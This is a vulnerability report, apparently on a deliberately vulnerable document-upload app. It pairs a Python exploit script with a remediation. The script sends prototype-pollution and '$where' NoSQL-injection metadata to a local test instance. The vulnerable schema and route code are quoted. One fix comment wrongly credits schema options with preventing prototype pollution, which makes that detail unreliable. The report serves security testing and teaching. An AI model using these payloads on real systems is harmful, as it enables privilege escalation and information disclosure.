# Vulnerability: File Path Exposure & Metadata Injection

## 1. Vulnerability Name
**CWE-200: Exposure of Sensitive Information & CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes**

## 2. Location in Code
- **File:** `backend/src/models/Document.js` (lines 19, 32-35)
- **File:** `backend/src/routes/documents.js` (lines 65-70)

```javascript
// Document.js - File path exposed in database
const documentSchema = new mongoose.Schema({
    // VULNERABILITY: File path exposed in database
    filePath: String,
    
    // VULNERABILITY: User-controlled metadata stored without validation
    metadata: {
        type: mongoose.Schema.Types.Mixed,
        default: {}
    }
});

// documents.js - File path returned in API responses
res.status(201).json({
    document: document,
    // VULNERABILITY: Expose server file path
    serverPath: req.file.path,
    systemInfo: {
        platform: process.platform,
        nodeVersion: process.version
    }
});
```

## 3. Technical Root Cause
The application stores and exposes full server file paths in the database and API responses, revealing internal directory structure. Additionally, the metadata field accepts arbitrary user input without validation, enabling NoSQL injection and prototype pollution attacks.

## 4. Proof of Concept Explanation
1. Upload a document and observe the exposed file path in the response
2. Query the database to see full server paths stored in plaintext
3. Inject malicious metadata to manipulate application behavior
4. Use file paths for directory traversal attacks

## 5. Exploit Script

```python
#!/usr/bin/env python3
import requests
import json

def exploit_file_path_exposure():
    base_url = "http://localhost:5000"
    
    # Login to get token
    login_data = {"email": "demo@tenantguard.com", "password": "demo123"}
    response = requests.post(f"{base_url}/api/auth/login", json=login_data)
    token = response.json().get('token')
    headers = {"Authorization": f"Bearer {token}"}
    
    print("[+] Testing file path exposure vulnerabilities...")
    
    # Test 1: File path exposure via upload
    print("\n[1] Testing file path exposure in upload response...")
    
    # Create test file
    with open('test_file.txt', 'w') as f:
        f.write('Test content for path exposure')
    
    # Upload file with malicious metadata
    malicious_metadata = {
        "__proto__": {"isAdmin": True},
        "$where": "this.userId == null",
        "constructor": {"prototype": {"polluted": True}}
    }
    
    with open('test_file.txt', 'rb') as f:
        files = {'file': ('test_file.txt', f, 'text/plain')}
        data = {
            'title': 'Test Document',
            'description': 'Testing path exposure',
            'metadata': json.dumps(malicious_metadata)
        }
        
        upload_response = requests.post(
            f"{base_url}/api/documents/upload",
            headers=headers,
            files=files,
            data=data
        )
    
    if upload_response.status_code == 201:
        result = upload_response.json()
        
        print("[!] FILE PATH EXPOSURE CONFIRMED")
        print(f"    Server Path: {result.get('serverPath')}")
        print(f"    System Info: {result.get('systemInfo')}")
        
        document_id = result.get('document', {}).get('_id')
        
        # Test 2: Retrieve document to see stored path
        print("\n[2] Testing stored file path in document data...")
        doc_response = requests.get(
            f"{base_url}/api/documents/{document_id}",
            headers=headers
        )
        
        if doc_response.status_code == 200:
            doc_data = doc_response.json()
            print("[!] STORED FILE PATH EXPOSED")
            print(f"    File Path: {doc_data.get('filePath')}")
            print(f"    Metadata: {doc_data.get('metadata')}")
    
    # Test 3: Metadata injection via document update
    print("\n[3] Testing metadata injection...")
    
    prototype_pollution = {
        "__proto__": {
            "isAdmin": True,
            "role": "admin"
        },
        "constructor": {
            "prototype": {
                "polluted": True,
                "admin": True
            }
        }
    }
    
    update_data = {
        "title": "Updated Document",
        "metadata": prototype_pollution
    }
    
    if 'document_id' in locals():
        update_response = requests.put(
            f"{base_url}/api/documents/{document_id}",
            headers=headers,
            json=update_data
        )
        
        if update_response.status_code == 200:
            print("[!] METADATA INJECTION SUCCESS")
            print(f"    Injected metadata: {prototype_pollution}")
    
    # Cleanup
    import os
    if os.path.exists('test_file.txt'):
        os.remove('test_file.txt')
    
    return True

if __name__ == "__main__":
    exploit_file_path_exposure()
```

## 6. Impact
- **Information Disclosure:** Server directory structure and file paths exposed
- **Directory Traversal:** File paths aid in path traversal attacks
- **Prototype Pollution:** Malicious metadata can modify application behavior
- **Privilege Escalation:** Metadata injection may bypass security controls

**CVSS Score:** 7.5 (High)

## 7. Fix Recommendation

Remove file path exposure and validate metadata:

```javascript
// Secure Document model
const documentSchema = new mongoose.Schema({
    tenantId: {
        type: mongoose.Schema.Types.ObjectId,
        ref: 'Tenant',
        required: true
    },
    userId: {
        type: mongoose.Schema.Types.ObjectId,
        ref: 'User',
        required: true
    },
    title: {
        type: String,
        required: true,
        maxlength: 255
    },
    description: {
        type: String,
        maxlength: 1000
    },
    filename: String, // Internal filename only
    originalName: String,
    fileType: String,
    fileSize: Number,
    // Remove filePath - never store full paths
    // filePath: String, // REMOVED
    
    visibility: {
        type: String,
        enum: ['private', 'shared', 'public'],
        default: 'private'
    },
    
    // Secure metadata with validation
    metadata: {
        tags: [String],
        category: String,
        customFields: {
            type: Map,
            of: String,
            validate: {
                validator: function(map) {
                    // Limit number of custom fields
                    return map.size <= 10;
                },
                message: 'Too many custom fields'
            }
        }
    }
}, { 
    timestamps: true,
    // Prevent prototype pollution
    minimize: false,
    versionKey: false
});

// Secure upload endpoint
router.post('/upload', auth, upload.single('file'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        
        const { title, description } = req.body;
        
        // Validate metadata if provided
        let metadata = {};
        if (req.body.metadata) {
            try {
                const parsedMetadata = JSON.parse(req.body.metadata);
                
                // Whitelist allowed metadata fields
                const allowedFields = ['tags', 'category'];
                for (const field of allowedFields) {
                    if (parsedMetadata[field]) {
                        metadata[field] = parsedMetadata[field];
                    }
                }
            } catch (e) {
                return res.status(400).json({ error: 'Invalid metadata format' });
            }
        }
        
        const document = new Document({
            tenantId: req.user.tenantId,
            userId: req.user._id,
            title: title || req.file.originalname,
            description: description || '',
            filename: req.file.filename, // Internal filename only
            originalName: req.file.originalname,
            fileType: path.extname(req.file.originalname),
            fileSize: req.file.size,
            metadata: metadata // Validated metadata only
        });
        
        await document.save();
        
        // Secure response - no file paths or system info
        res.status(201).json({
            success: true,
            message: 'File uploaded successfully',
            document: {
                id: document._id,
                title: document.title,
                originalName: document.originalName,
                fileType: document.fileType,
                fileSize: document.fileSize,
                createdAt: document.createdAt
            }
        });
    } catch (error) {
        res.status(500).json({ error: 'Upload failed' });
    }
});

// Secure file serving
const serveFile = (req, res) => {
    // Construct path securely without exposing structure
    const uploadsDir = path.resolve(__dirname, '..', 'uploads');
    const filename = req.params.filename;
    
    // Validate filename
    if (!filename || filename.includes('..') || filename.includes('/')) {
        return res.status(400).json({ error: 'Invalid filename' });
    }
    
    const filePath = path.join(uploadsDir, filename);
    
    // Ensure path is within uploads directory
    if (!filePath.startsWith(uploadsDir)) {
        return res.status(400).json({ error: 'Invalid file path' });
    }
    
    res.sendFile(filePath);
};
```